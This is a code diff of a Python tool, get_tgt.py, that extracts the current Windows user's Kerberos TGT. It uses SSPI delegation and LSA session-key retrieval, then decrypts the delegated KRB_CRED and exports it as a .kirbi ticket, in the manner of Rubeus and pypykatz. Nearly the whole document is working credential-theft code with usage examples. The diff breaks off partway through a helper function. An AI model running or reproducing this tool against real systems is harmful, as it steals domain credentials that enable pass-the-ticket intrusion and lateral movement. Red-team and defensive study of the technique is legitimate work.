@@ -1,127 +1,89 @@
 """
-get_tgt.py - Windows Kerberos TGT Extraction Tool
+Extract the current Windows user's Kerberos TGT via SSPI/LSA APIs.
 
-Extracts the currently logged-in Windows user's Kerberos TGT using SSPI/LSA APIs.
-Implements security context delegation (matching tools like Rubeus and pypykatz).
-
-Workflow:
-  1. Acquire Credentials Handle via SSPI (secur32.dll).
-  2. Initialize Security Context with ISC_REQ_DELEGATE flag to target SPN.
-  3. Query LSA for the Session Key associated with the target ticket.
-  4. Decrypt the GSS-API AP-REQ Authenticator token returned by SSPI.
-  5. Extract and parse the delegated TGT payload into a usable .kirbi (KRB_CRED) bytes object.
+Usage:
+    python get_tgt.py
+    python get_tgt.py --target cifs/dc.corp.local
+    python get_tgt.py -o ticket.kirbi
 
 Dependencies:
-  pip install minikerberos asn1crypto
+    pip install minikerberos asn1crypto
 """
-
-from __future__ import annotations
-
-import argparse
-import ctypes
-from ctypes import (
-    POINTER,
-    Structure,
-    addressof,
-    byref,
-    cast,
-    create_string_buffer,
-    pointer,
-    string_at,
-)
-import ctypes.wintypes
-from contextlib import contextmanager
+import base64
 import os
 import sys
-from typing import Any, Dict, Generator, Tuple
+import ctypes
+import ctypes.wintypes
+from ctypes import (
+    Structure, POINTER, byref, pointer, cast, addressof,
+    c_void_p, c_uint32, c_int32, c_ushort, c_char, c_byte,
+    c_ulong, c_long, create_string_buffer, sizeof, string_at, WinError,
+)
+from ctypes.wintypes import HANDLE, DWORD, LONG, WORD
 
-# Third-party ASN.1 and Kerberos dependencies
 from asn1crypto import core
-from minikerberos.protocol.asn1_structs import AP_REQ, KRB_CRED, Authenticator, EncryptedData
+from minikerberos.protocol.asn1_structs import AP_REQ, KRB_CRED, EncryptedData, Authenticator, EncKrbCredPart
 from minikerberos.protocol.encryption import Key, _enctype_table
-from minikerberos.protocol.structures import AuthenticatorChecksum
+from minikerberos.protocol.structures import AuthenticatorChecksum, ChecksumFlags
+
 
 # ============================================================
-#  Type Aliases & Architecture Constants (Best Practice)
+#  Type aliases
 # ============================================================
-# Explicitly scope primitives through ctypes to prevent namespace pollution
-PVOID = ctypes.c_void_p
+PVOID = c_void_p
 PPVOID = POINTER(PVOID)
-PHANDLE = POINTER(ctypes.wintypes.HANDLE)
-NTSTATUS = ctypes.c_long
-
-# Guaranteed pointer-width types for 32-bit and 64-bit architectures
-ULONG_PTR = ctypes.c_uint64 if ctypes.sizeof(PVOID) == 8 else ctypes.c_uint32
+PHANDLE = POINTER(HANDLE)
+NTSTATUS = LONG
+PNTSTATUS = POINTER(NTSTATUS)
+PULONG = POINTER(c_ulong)
 LARGE_INTEGER = ctypes.c_longlong
-
-# SSPI & LSA Constants
-SEC_E_OK = 0x00000000
-SEC_E_CONTINUE_NEEDED = 0x00090312
-SECPKG_CRED_OUTBOUND = 2
-
-ISC_REQ_DELEGATE = 0x00000001
-ISC_REQ_MUTUAL_AUTH = 0x00000002
-ISC_REQ_ALLOCATE_MEMORY = 0x00000100
-KerbRetrieveEncodedTicketMessage = 8
-
-# Bind Windows Security DLL
-secur32 = ctypes.windll.Secur32  # type: ignore
+ULONG = c_ulong
+USHORT = c_ushort
 
 
 # ============================================================
-#  Win32 C-Structures
+#  LSA structures
 # ============================================================
 
 class LUID(Structure):
-    """Locally Unique Identifier (LUID) representation."""
-    _fields_ = [("LowPart", ctypes.wintypes.DWORD), ("HighPart", ctypes.c_long)]
-
-    def to_int(self) -> int:
+    _fields_ = [("LowPart", ULONG), ("HighPart", LONG)]
+    def to_int(self):
         return (self.HighPart << 32) + self.LowPart
+    @staticmethod
+    def from_int(i):
+        l = LUID(); l.HighPart = i >> 32; l.LowPart = i & 0xFFFFFFFF; return l
 
-    @classmethod
-    def from_int(cls, value: int) -> LUID:
-        luid = cls()
-        luid.HighPart = (value >> 32) & 0xFFFFFFFF
-        luid.LowPart = value & 0xFFFFFFFF
-        return luid
+PLUID = POINTER(LUID)
 
 
 class LSA_STRING(Structure):
-    """LSA ANSI string container."""
-    _fields_ = [
-        ("Length", ctypes.c_short),
-        ("MaximumLength", ctypes.c_short),
-        ("Buffer", POINTER(ctypes.c_char)),
-    ]
+    _fields_ = [("Length", USHORT), ("MaximumLength", USHORT), ("Buffer", POINTER(c_char))]
+
+PLSA_STRING = POINTER(LSA_STRING)
 
 
 class LSA_UNICODE_STRING(Structure):
-    """LSA UTF-16 Unicode string container."""
-    _fields_ = [
-        ("Length", ctypes.c_short),
-        ("MaximumLength", ctypes.c_short),
-        ("Buffer", POINTER(ctypes.wintypes.WCHAR)),
-    ]
+    _fields_ = [("Length", USHORT), ("MaximumLength", USHORT), ("Buffer", POINTER(c_char))]
+    @staticmethod
+    def from_string(s):
+        enc = s.encode("utf-16-le")
+        lus = LSA_UNICODE_STRING()
+        buf = create_string_buffer(enc, len(enc))
+        lus.Buffer = cast(buf, POINTER(c_char))
+        lus.MaximumLength = len(enc) + 1
+        lus.Length = len(enc)
+        return lus
+    def to_string(self):
+        return string_at(self.Buffer, self.MaximumLength).decode("utf-16-le", errors="replace").rstrip("\x00")
 
 
 class KERB_CRYPTO_KEY(Structure):
-    """Kerberos Encryption Key descriptor."""
-    _fields_ = [
-        ("KeyType", ctypes.c_long),
-        ("Length", ctypes.wintypes.DWORD),
-        ("Value", PVOID),
-    ]
-
-    def to_dict(self) -> Dict[str, Any]:
-        return {
-            "KeyType": self.KeyType,
-            "Key": string_at(self.Value, self.Length),
-        }
+    _fields_ = [("KeyType", LONG), ("Length", ULONG), ("Value", PVOID)]
+    def to_dict(self):
+        return {"KeyType": self.KeyType, "Key": string_at(self.Value, self.Length)}
 
 
 class KERB_EXTERNAL_TICKET(Structure):
-    """Structure returned by LSA during ticket retrieval."""
     _fields_ = [
         ("ServiceName", PVOID),
         ("TargetName", PVOID),
@@ -130,334 +92,280 @@ class KERB_EXTERNAL_TICKET(Structure):
         ("TargetDomainName", LSA_UNICODE_STRING),
         ("AltTargetDomainName", LSA_UNICODE_STRING),
         ("SessionKey", KERB_CRYPTO_KEY),
-        ("TicketFlags", ctypes.wintypes.DWORD),
-        ("Flags", ctypes.wintypes.DWORD),
+        ("TicketFlags", ULONG),
+        ("Flags", ULONG),
         ("KeyExpirationTime", LARGE_INTEGER),
         ("StartTime", LARGE_INTEGER),
         ("EndTime", LARGE_INTEGER),
         ("RenewUntil", LARGE_INTEGER),
         ("TimeSkew", LARGE_INTEGER),
-        ("EncodedTicketSize", ctypes.wintypes.DWORD),
+        ("EncodedTicketSize", ULONG),
         ("EncodedTicket", PVOID),
     ]
-
-    def get_data(self) -> Dict[str, Any]:
-        return {
-            "Key": self.SessionKey.to_dict(),
-            "Ticket": string_at(self.EncodedTicket, self.EncodedTicketSize),
-        }
+    def get_data(self):
+        return {"Key": self.SessionKey.to_dict(), "Ticket": string_at(self.EncodedTicket, self.EncodedTicketSize)}
 
 
 class KERB_RETRIEVE_TKT_RESPONSE(Structure):
-    """LSA query response wrapper."""
     _fields_ = [("Ticket", KERB_EXTERNAL_TICKET)]
 
 
-class SecHandle(Structure):
-    """SSPI Security Handle (CredHandle / CtxtHandle)."""
-    _fields_ = [("dwLower", ULONG_PTR), ("dwUpper", ULONG_PTR)]
+# ============================================================
+#  SSPI structures
+# ============================================================
 
+class SecHandle(Structure):
+    _fields_ = [("dwLower", POINTER(ULONG)), ("dwUpper", POINTER(ULONG))]
+    def __init__(self):
+        super().__init__(pointer(ULONG()), pointer(ULONG()))
 
 CredHandle = SecHandle
+PCredHandle = POINTER(CredHandle)
 CtxtHandle = SecHandle
+PCtxtHandle = POINTER(CtxtHandle)
 
 
 class TimeStamp(Structure):
-    """Win32 FILETIME representation."""
-    _fields_ = [
-        ("dwLowDateTime", ctypes.wintypes.DWORD),
-        ("dwHighDateTime", ctypes.wintypes.DWORD),
-    ]
+    _fields_ = [("dwLowDateTime", ULONG), ("dwHighDateTime", ULONG)]
+
+PTimeStamp = POINTER(TimeStamp)
 
 
 class SecBuffer(Structure):
-    """SSPI Security Buffer descriptor."""
-    _fields_ = [
-        ("cbBuffer", ctypes.wintypes.DWORD),
-        ("BufferType", ctypes.wintypes.DWORD),
-        ("pvBuffer", PVOID),
-    ]
+    _fields_ = [("cbBuffer", ULONG), ("BufferType", ULONG), ("pvBuffer", PVOID)]
+    def __init__(self, token=None, buffer_type=2):
+        if token is None:
+            token = b"\x00" * 2880
+        self._buf = create_string_buffer(token, len(token))  # keep ref alive!
+        super().__init__(sizeof(self._buf), buffer_type, cast(self._buf, PVOID))
+    @property
+    def Buffer(self):
+        return (self.BufferType, string_at(self.pvBuffer, self.cbBuffer))
 
 
 class SecBufferDesc(Structure):
-    """SSPI Security Buffer Array container."""
-    _fields_ = [
-        ("ulVersion", ctypes.wintypes.DWORD),
-        ("cBuffers", ctypes.wintypes.DWORD),
-        ("pBuffers", POINTER(SecBuffer)),
-    ]
+    _fields_ = [("ulVersion", ULONG), ("cBuffers", ULONG), ("pBuffers", POINTER(SecBuffer))]
+    def __init__(self, sb=None):
+        if sb is not None:
+            # keep elements alive via a slice copy
+            arr = (SecBuffer * len(sb))(*sb)
+            self._buf = arr  # keep ref
+            super().__init__(0, len(sb), arr)
+        else:
+            self._buf = SecBuffer()
+            super().__init__(0, 1, pointer(self._buf))
+    @property
+    def Buffers(self):
+        return [self.pBuffers[i].Buffer for i in range(self.cBuffers)]
+
+PSecBufferDesc = POINTER(SecBufferDesc)
 
 
 # ============================================================
-#  API Error Checking Routines
+#  Constants
+# ============================================================
+KerbRetrieveEncodedTicketMessage = 8
+
+SEC_E_OK = 0x00000000
+SEC_E_CONTINUE_NEEDED = 0x00090312
+
+SECPKG_CRED_OUTBOUND = 2
+
+ISC_REQ_DELEGATE = 0x00000001
+ISC_REQ_MUTUAL_AUTH = 0x00000002
+ISC_REQ_ALLOCATE_MEMORY = 0x00000100
+
+
+# ============================================================
+#  WinAPI — LSA
 # ============================================================
 
-def _check_ntstatus(result: int, func: Any, args: Tuple[Any, ...]) -> int:
-    """Error check callback for Win32 NTSTATUS functions."""
+secur32 = ctypes.windll.Secur32
+
+def _check_nt(result, func, args):
     if result != 0:
-        raise ctypes.WinError(result)
+        raise WinError(result)
     return result
 
 
-def _check_sspi(result: int, func: Any, args: Tuple[Any, ...]) -> int:
-    """Error check callback for SSPI functions."""
+def LsaConnectUntrusted():
+    f = secur32.LsaConnectUntrusted
+    f.argtypes = [PHANDLE]; f.restype = NTSTATUS; f.errcheck = _check_nt
+    h = HANDLE(-1)
+    f(byref(h))
+    return h
+
+
+def LsaDeregisterLogonProcess(h):
+    f = secur32.LsaDeregisterLogonProcess
+    f.argtypes = [HANDLE]; f.restype = NTSTATUS; f.errcheck = _check_nt
+    f(h)
+
+
+def LsaFreeReturnBuffer(p):
+    f = secur32.LsaFreeReturnBuffer
+    f.argtypes = [PVOID]; f.restype = NTSTATUS; f.errcheck = _check_nt
+    f(p)
+
+
+def LsaLookupAuthenticationPackage(h, pkg):
+    f = secur32.LsaLookupAuthenticationPackage
+    f.argtypes = [HANDLE, PLSA_STRING, PULONG]
+    f.restype = NTSTATUS; f.errcheck = _check_nt
+
+    b = pkg.encode() if isinstance(pkg, str) else pkg
+    s = LSA_STRING(); s.Buffer = create_string_buffer(b); s.Length = len(b); s.MaximumLength = len(b) + 1
+    pid = ULONG(0)
+    f(h, byref(s), byref(pid))
+    return pid.value
+
+
+def LsaCallAuthenticationPackage(lsa_handle, pkg_id, msg):
+    """
+    Returns (response_bytes, free_ptr, ret_status).
+    Caller must LsaFreeReturnBuffer(free_ptr) once response parsing is done.
+    """
+    f = secur32.LsaCallAuthenticationPackage
+    f.argtypes = [HANDLE, ULONG, PVOID, ULONG, PPVOID, PULONG, PNTSTATUS]
+    f.restype = ULONG; f.errcheck = _check_nt
+
+    msg_len = sizeof(msg) if isinstance(msg, Structure) else len(msg) if isinstance(msg, bytes) else 0
+
+    ret_p = PVOID(); ret_len = ULONG(0); ret_st = LONG(-1)
+    f(lsa_handle, pkg_id, byref(msg), msg_len, byref(ret_p), byref(ret_len), byref(ret_st))
+
+    if ret_st.value != 0:
+        raise WinError(ret_st.value)
+
+    if ret_len.value > 0:
+        return string_at(ret_p, ret_len.value), ret_p, ret_st.value
+    return b"", None, ret_st.value
+
+
+# ============================================================
+#  WinAPI — SSPI
+# ============================================================
+
+def _check_sec(result, func, args):
     if result in (SEC_E_OK, SEC_E_CONTINUE_NEEDED):
         return result
-    raise ctypes.WinError(result)
+    raise RuntimeError(f"SSPI call failed: {result:#x}")
 
 
-# Setup Win32 Function Signatures (Prevents 64-bit integer conversion overflow errors)
-if hasattr(secur32, "FreeContextBuffer"):
-    secur32.FreeContextBuffer.argtypes = [PVOID]
-    secur32.FreeContextBuffer.restype = NTSTATUS
-
-
-# ============================================================
-#  Resource Management & LSA Helpers
-# ============================================================
-
-@contextmanager
-def get_lsa_handle() -> Generator[ctypes.wintypes.HANDLE, None, None]:
-    """
-    RAII context manager for managing LSA Connection lifetime safely.
-    Guarantees LsaDeregisterLogonProcess is called even during runtime exceptions.
-    """
-    lsa_connect = secur32.LsaConnectUntrusted
-    lsa_connect.argtypes = [PHANDLE]
-    lsa_connect.restype = NTSTATUS
-    lsa_connect.errcheck = _check_ntstatus
-
-    lsa_close = secur32.LsaDeregisterLogonProcess
-    lsa_close.argtypes = [ctypes.wintypes.HANDLE]
-    lsa_close.restype = NTSTATUS
-
-    handle = ctypes.wintypes.HANDLE()
-    lsa_connect(byref(handle))
-    try:
-        yield handle
-    finally:
-        lsa_close(handle)
-
-
-def lsa_lookup_authentication_package(lsa_handle: ctypes.wintypes.HANDLE, package_name: str) -> int:
-    """Resolves the LSA Authentication Package ID (e.g., 'kerberos')."""
-    f = secur32.LsaLookupAuthenticationPackage
-    f.argtypes = [ctypes.wintypes.HANDLE, POINTER(LSA_STRING), POINTER(ctypes.wintypes.DWORD)]
-    f.restype = NTSTATUS
-    f.errcheck = _check_ntstatus
-
-    encoded_pkg = package_name.encode("ascii")
-    lsa_str = LSA_STRING()
-    buf = create_string_buffer(encoded_pkg)
-    lsa_str.Buffer = cast(buf, POINTER(ctypes.c_char))
-    lsa_str.Length = len(encoded_pkg)
-    lsa_str.MaximumLength = len(encoded_pkg) + 1
-
-    pkg_id = ctypes.wintypes.DWORD(0)
-    f(lsa_handle, byref(lsa_str), byref(pkg_id))
-    return pkg_id.value
-
-
-def lsa_call_authentication_package(
-        lsa_handle: ctypes.wintypes.HANDLE, pkg_id: int, request_buffer: bytes
-) -> Tuple[bytes, PVOID]:
-    """Issues an authentication package message to LSA."""
-    f = secur32.LsaCallAuthenticationPackage
-    f.argtypes = [
-        ctypes.wintypes.HANDLE,
-        ctypes.wintypes.DWORD,
-        PVOID,
-        ctypes.wintypes.DWORD,
-        PPVOID,
-        POINTER(ctypes.wintypes.DWORD),
-        POINTER(NTSTATUS),
-    ]
-    f.restype = NTSTATUS
-    f.errcheck = _check_ntstatus
-
-    response_ptr = PVOID()
-    response_len = ctypes.wintypes.DWORD(0)
-    protocol_status = NTSTATUS(0)
-
-    f(
-        lsa_handle,
-        pkg_id,
-        request_buffer,
-        len(request_buffer),
-        byref(response_ptr),
-        byref(response_len),
-        byref(protocol_status),
-    )
-
-    if protocol_status.value != 0:
-        raise ctypes.WinError(protocol_status.value)
-
-    data = string_at(response_ptr, response_len.value) if response_len.value > 0 else b""
-    return data, response_ptr
-
-
-def acquire_credentials_handle(package_name: str, usage_flags: int) -> CredHandle:
-    """Acquires a handle to pre-existing credentials via SSPI."""
+def AcquireCredentialsHandle(pkg_name, cred_usage):
     f = secur32.AcquireCredentialsHandleA
-    f.argtypes = [
-        POINTER(ctypes.c_char),
-        POINTER(ctypes.c_char),
-        ctypes.wintypes.DWORD,
-        PVOID,
-        PVOID,
-        PVOID,
-        PVOID,
-        POINTER(CredHandle),
-        POINTER(TimeStamp),
-    ]
-    f.restype = ctypes.c_ulong
-    f.errcheck = _check_sspi
+    f.argtypes = [POINTER(c_char), POINTER(c_char), ULONG, PLUID, PVOID, PVOID, PVOID, PCredHandle, PTimeStamp]
+    f.restype = ULONG; f.errcheck = _check_sec
 
-    cred_handle = CredHandle()
-    pts = TimeStamp()
-    pkg_buf = create_string_buffer(package_name.encode("ascii"))
-
-    f(None, pkg_buf, usage_flags, None, None, None, None, byref(cred_handle), byref(pts))
-    return cred_handle
+    pn = create_string_buffer(pkg_name.encode("ascii"))
+    creds = CredHandle(); ts = TimeStamp()
+    f(None, pn, cred_usage, None, None, None, None, byref(creds), byref(ts))
+    return creds
 
 
-def initialize_security_context(
-        creds: CredHandle, target_spn: str, flags: int
-) -> Tuple[int, bytes]:
-    """Initiates the client-side security context generation."""
+def InitializeSecurityContext(creds, spn, flags, ctx_in=None, token=None):
     f = secur32.InitializeSecurityContextA
-    f.argtypes = [
-        POINTER(CredHandle),
-        POINTER(CtxtHandle),
-        POINTER(ctypes.c_char),
-        ctypes.wintypes.DWORD,
-        ctypes.wintypes.DWORD,
-        ctypes.wintypes.DWORD,
-        POINTER(SecBufferDesc),
-        ctypes.wintypes.DWORD,
-        POINTER(CtxtHandle),
-        POINTER(SecBufferDesc),
-        POINTER(ctypes.wintypes.DWORD),
-        POINTER(TimeStamp),
-    ]
-    f.restype = ctypes.c_ulong
-    f.errcheck = _check_sspi
+    f.argtypes = [PCredHandle, PCtxtHandle, POINTER(c_char), ULONG, ULONG, ULONG,
+                  PSecBufferDesc, ULONG, PCtxtHandle, PSecBufferDesc, PULONG, PTimeStamp]
+    f.restype = ULONG; f.errcheck = _check_sec
 
-    target_buf = create_string_buffer(target_spn.encode("ascii"))
-    out_sec_buf = SecBuffer()
-    out_sec_buf.cbBuffer = 0
-    out_sec_buf.BufferType = 2  # SECBUFFER_TOKEN
-    out_sec_buf.pvBuffer = None
+    pspn = create_string_buffer(spn.encode("ascii"))
+    outbuf = SecBufferDesc()
+    outflags = ULONG(); expiry = TimeStamp()
+    ctx_out = CtxtHandle()
 
-    out_desc = SecBufferDesc()
-    out_desc.ulVersion = 0
-    out_desc.cBuffers = 1
-    out_desc.pBuffers = pointer(out_sec_buf)
+    if token is not None:
+        inbuf = SecBufferDesc([SecBuffer(token)])
+        inbuf_ptr = byref(inbuf)
+    else:
+        inbuf_ptr = None
 
-    context_handle = CtxtHandle()
-    out_flags = ctypes.wintypes.DWORD()
-    expiry = TimeStamp()
+    if ctx_in is None:
+        res = f(byref(creds), None, pspn, flags, 0, 0, inbuf_ptr, 0,
+                byref(ctx_out), byref(outbuf), byref(outflags), byref(expiry))
+    else:
+        res = f(byref(creds), byref(ctx_in), pspn, flags, 0, 0, inbuf_ptr, 0,
+                byref(ctx_out), byref(outbuf), byref(outflags), byref(expiry))
 
-    status = f(
-        byref(creds),
-        None,
-        target_buf,
-        flags,
-        0,
-        0,
-        None,
-        0,
-        byref(context_handle),
-        byref(out_desc),
-        byref(out_flags),
-        byref(expiry),
-    )
-
-    # Copy output buffer bytes safely
-    token_data = string_at(out_sec_buf.pvBuffer, out_sec_buf.cbBuffer)
-
-    # Explicitly free memory allocated by Windows SSPI allocator
-    if out_sec_buf.pvBuffer:
-        secur32.FreeContextBuffer(out_sec_buf.pvBuffer)
-
-    return status, token_data
+    return res, ctx_out, outbuf.Buffers
 
 
 # ============================================================
-#  Request Serialization & ASN.1 Decryption
+#  Build KerbRetrieveEncodedTicketMessage
 # ============================================================
 
-def build_retrieve_ticket_request(target_spn: str, luid_val: int = 0) -> bytes:
-    """
-    Constructs a contiguous memory block for KERB_RETRIEVE_TKT_REQUEST without
-    triggering integer overflow during 64-bit pointer calculations.
-    """
-    target_encoded = target_spn.encode("utf-16-le") + b"\x00\x00"
+def _build_retrieve_request(target, luid=0):
+    if isinstance(luid, int):
+        luid = LUID.from_int(luid)
 
-    class _KERB_RETRIEVE_TKT_REQUEST(Structure):
-        _pack_ = 8  # Enforce 64-bit C-runtime struct alignment
+    target_enc = target.encode("utf-16-le") + b"\x00\x00"
+    target_alloc = len(target_enc)
+
+    class _REQ(Structure):
         _fields_ = [
-            ("MessageType", ctypes.wintypes.DWORD),
+            ("MessageType", ULONG),
             ("LogonId", LUID),
             ("TargetName", LSA_UNICODE_STRING),
-            ("TicketFlags", ctypes.wintypes.DWORD),
-            ("CacheOptions", ctypes.wintypes.DWORD),
-            ("EncryptionType", ctypes.c_long),
-            ("CredentialsHandle", SecHandle),
+            ("TicketFlags", ULONG),
+            ("CacheOptions", ULONG),
+            ("EncryptionType", LONG),
+            ("CredentialsHandle", PVOID),
+            ("_pad", PVOID),
+            ("TargetNameData", c_byte * target_alloc),
         ]
 
-    header_size = ctypes.sizeof(_KERB_RETRIEVE_TKT_REQUEST)
-    total_size = header_size + len(target_encoded)
-
-    # Allocate a single contiguous C byte buffer
-    buf = create_string_buffer(total_size)
-    buf_address = addressof(buf)
-
-    # Overlaid struct instance
-    req = _KERB_RETRIEVE_TKT_REQUEST.from_buffer(buf)
+    req = _REQ()
     req.MessageType = KerbRetrieveEncodedTicketMessage
-    req.LogonId = LUID.from_int(luid_val)
-    req.CacheOptions = 8  # KERB_RETRIEVE_TICKET_USE_CACHE_ONLY
+    req.LogonId = luid
+    req.TicketFlags = 0
+    req.CacheOptions = 8
+    req.EncryptionType = 0
+    req.CredentialsHandle = None
+    req.TargetNameData = (c_byte * target_alloc)(*target_enc)
 
-    # Move target string to buffer end
-    ctypes.memmove(buf_address + header_size, target_encoded, len(target_encoded))
+    # Point LSA_UNICODE_STRING.Buffer to the trailing name bytes
+    struct_end = addressof(req) + sizeof(req)
+    name_start = struct_end - target_alloc
+    name_start_aligned = name_start - (name_start % sizeof(c_void_p))
 
-    # Set unicode string buffer address explicitly using PVOID to avoid 64-bit integer overflow
-    string_address = buf_address + header_size
-    req.TargetName.Length = len(target_encoded) - 2
-    req.TargetName.MaximumLength = len(target_encoded)
-    req.TargetName.Buffer = cast(PVOID(string_address), POINTER(ctypes.wintypes.WCHAR))
+    lsa_target = LSA_UNICODE_STRING()
+    lsa_target.Length = len(target.encode("utf-16-le"))
+    lsa_target.MaximumLength = target_alloc
+    lsa_target.Buffer = cast(name_start_aligned, POINTER(c_char))
+    req.TargetName = lsa_target
+    return req
 
-    return bytes(buf)
+
+# ============================================================
+#  Extract ticket + session key from LSA
+# ============================================================
+
+def extract_ticket(lsa_handle, pkg_id, luid, target):
+    msg = _build_retrieve_request(target, luid)
+    ret_msg, free_ptr, ret_status = LsaCallAuthenticationPackage(lsa_handle, pkg_id, msg)
+    if ret_status != 0:
+        raise WinError(ret_status)
+    resp = KERB_RETRIEVE_TKT_RESPONSE.from_buffer_copy(ret_msg)
+    ticket_data = resp.Ticket.get_data()
+    if free_ptr is not None:
+        LsaFreeReturnBuffer(free_ptr)
+    return ticket_data
 
 
-def extract_ticket_from_lsa(
-        lsa_handle: ctypes.wintypes.HANDLE, pkg_id: int, target_spn: str
-) -> Dict[str, Any]:
-    """Queries LSA to extract the Session Key and raw Ticket payload for an SPN."""
-    req_bytes = build_retrieve_ticket_request(target_spn)
-    resp_bytes, free_ptr = lsa_call_authentication_package(lsa_handle, pkg_id, req_bytes)
-
-    try:
-        resp = KERB_RETRIEVE_TKT_RESPONSE.from_buffer_copy(resp_bytes)
-        ticket_payload = resp.Ticket.get_data()
-    finally:
-        if free_ptr:
-            secur32.LsaFreeReturnBuffer(free_ptr)
-
-    return ticket_payload
-
+# ============================================================
+#  ASN1 — InitialContextToken (RFC 2743)
+# ============================================================
 
 class MechType(core.ObjectIdentifier):
     _map = {"1.2.840.113554.1.2.2": "KRB5 - Kerberos 5"}
 
 
 class InitialContextToken(core.Sequence):
-    """GSS-API InitialContextToken parser (RFC 2743)."""
     class_ = 1
     tag = 0
     _fields = [
         ("thisMech", MechType, {"optional": False}),
+        ("unk_bool", core.Boolean, {"optional": False}),
         ("innerContextToken", core.Any, {"optional": False}),
     ]
     _oid_pair = ("thisMech", "innerContextToken")
@@ -465,83 +373,147 @@ class InitialContextToken(core.Sequence):
 
 
 # ============================================================
-#  Main Execution Logic
+#  Main
 # ============================================================
 
-def get_tgt(target_spn: str | None = None) -> bytes:
+def get_tgt(target=None):
     """
-    Extracts the current user's TGT as a raw KRB_CRED (.kirbi) binary blob.
-
-    :param target_spn: SPN to request context for. Defaults to cifs/<LOGONSERVER>.
-    :return: Raw KRB_CRED bytes.
+    Returns the TGT as a KRB_CRED (kirbi) bytes object.
     """
-    if target_spn is None:
-        logon_server = os.environ.get("LOGONSERVER", "").lstrip("\\")
-        if not logon_server:
-            raise RuntimeError("No target specified and LOGONSERVER environment variable is empty.")
-        target_spn = f"cifs/{logon_server}"
 
-    # Step 1: Query Authentication Package ID
-    with get_lsa_handle() as lsa_handle:
-        pkg_id = lsa_lookup_authentication_package(lsa_handle, "kerberos")
+    # --- default target ---
+    if target is None:
+        ls = os.environ.get("LOGONSERVER", "").lstrip("\\")
+        if not ls:
+            raise RuntimeError("No --target and LOGONSERVER not set.")
+        target = f"cifs/{ls}"
 
-    # Step 2: Issue SSPI delegation request to generate AP-REQ containing TGT delegation structure
-    creds = acquire_credentials_handle("kerberos", SECPKG_CRED_OUTBOUND)
-    sspi_flags = ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH | ISC_REQ_ALLOCATE_MEMORY
-    _, raw_token = initialize_security_context(creds, target_spn, sspi_flags)
+    # --- LSA kerberos package ID ---
+    lsa = LsaConnectUntrusted()
+    try:
+        pkg_id = LsaLookupAuthenticationPackage(lsa, "kerberos")
+    finally:
+        LsaDeregisterLogonProcess(lsa)
 
-    # Step 3: Extract Session Key from LSA
-    with get_lsa_handle() as lsa_handle:
-        ticket_data = extract_ticket_from_lsa(lsa_handle, pkg_id, target_spn)
+    # --- SSPI: get AP-REQ w/ delegation ---
+    creds = AcquireCredentialsHandle("kerberos", SECPKG_CRED_OUTBOUND)
+    flags = ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH | ISC_REQ_ALLOCATE_MEMORY
+    res, ctx, bufs = InitializeSecurityContext(creds, target, flags)
 
-    session_key = Key(ticket_data["Key"]["KeyType"], ticket_data["Key"]["Key"])
+    if res not in (SEC_E_OK, SEC_E_CONTINUE_NEEDED):
+        raise RuntimeError(f"InitializeSecurityContext failed: {res:#x}")
 
-    # Step 4: Parse AP-REQ inside the GSS-API InitialContextToken container
+    raw_token = bufs[0][1]  # ASN1 InitialContextToken containing AP-REQ
+
+    # --- session key via LSA ---
+    lsa2 = LsaConnectUntrusted()
+    try:
+        raw_ticket = extract_ticket(lsa2, pkg_id, 0, target)
+    finally:
+        LsaDeregisterLogonProcess(lsa2)
+
+    key = Key(raw_ticket["Key"]["KeyType"], raw_ticket["Key"]["Key"])
+
+    # --- parse AP-REQ ---
     ict = InitialContextToken.load(raw_token)
     apreq = AP_REQ(ict.native["innerContextToken"]).native
 
-    # Step 5: Decrypt Authenticator structure using the Session Key
-    etype = apreq["authenticator"]["etype"]
-    cipher = _enctype_table[etype]
-    decrypted_auth = cipher.decrypt(session_key, 11, apreq["authenticator"]["cipher"])
-    authenticator = Authenticator.load(decrypted_auth).native
+    # --- decrypt authenticator ---
+    cipher = _enctype_table[apreq["authenticator"]["etype"]]
+    auth_plain = cipher.decrypt(key, 11, apreq["authenticator"]["cipher"])
+    authenticator = Authenticator.load(auth_plain).native
 
-    # Step 6: Validate Checksum and extract delegated KRB_CRED
-    cksum = authenticator["cksum"]
-    if cksum["cksumtype"] != 0x8003:
-        raise ValueError(f"Unexpected Checksum type: {cksum['cksumtype']:#x}")
+    # --- delegation checksum ---
+    ck = authenticator["cksum"]
+    if ck["cksumtype"] != 0x8003:
+        raise RuntimeError(f"Unexpected checksum type: {ck['cksumtype']:#x}")
 
-    checksum_data = AuthenticatorChecksum.from_bytes(cksum["checksum"])
-    if "GSS_C_DELEG_FLAG" not in checksum_data.flags:
-        raise RuntimeError("GSS_C_DELEG_FLAG not present in checksum. No delegated TGT returned by system.")
+    cdata = AuthenticatorChecksum.from_bytes(ck["checksum"])
+    if ChecksumFlags.GSS_C_DELEG_FLAG not in cdata.flags:
+        raise RuntimeError("GSS_C_DELEG_FLAG not set -- no delegated TGT")
 
-    # Step 7: Decrypt the EncryptedData portion of KRB_CRED payload
-    cred_orig = KRB_CRED.load(checksum_data.delegation_data).native
-    decrypted_cred = cipher.decrypt(session_key, 14, cred_orig["enc-part"]["cipher"])
+    # --- decrypt KRB_CRED ---
+    cred_native = KRB_CRED.load(cdata.delegation_data).native
+    cred_plain = cipher.decrypt(key, 14, cred_native["enc-part"]["cipher"])
 
-    # Reconstruct KRB_CRED structure with decrypted payload
-    cred_orig["enc-part"] = EncryptedData({"etype": 0, "cipher": decrypted_cred})
-    return KRB_CRED(cred_orig).dump()
+    cred_native["enc-part"] = EncryptedData({"etype": 0, "cipher": cred_plain})
+    return KRB_CRED(cred_native).dump()
 
 
-def main() -> None:
-    """Command Line Interface Entrypoint."""
-    parser = argparse.ArgumentParser(description="Extract Windows User Kerberos TGT")
-    parser.add_argument("--target", help="Target SPN (Default: cifs/<LOGONSERVER>)")
-    parser.add_argument("-o", "--out-file", help="Destination path for output .kirbi file")
-    args = parser.parse_args()
+# ============================================================
+#  CLI
+# ============================================================
 
-    try:
-        kirbi_bytes = get_tgt(args.target)
-        if args.out_file:
-            with open(args.out_file, "wb") as f:
-                f.write(kirbi_bytes)
-            print(f"[+] TGT exported successfully to: {args.out_file}")
-        else:
-            print(f"[+] TGT Extracted successfully ({len(kirbi_bytes)} bytes).")
-    except Exception as exc:
-        print(f"[-] Failed to extract TGT: {exc}", file=sys.stderr)
-        sys.exit(1)
+def _print_ticket_info(raw_ticket):
+    from minikerberos.protocol.asn1_structs import KRB_CRED as _KC
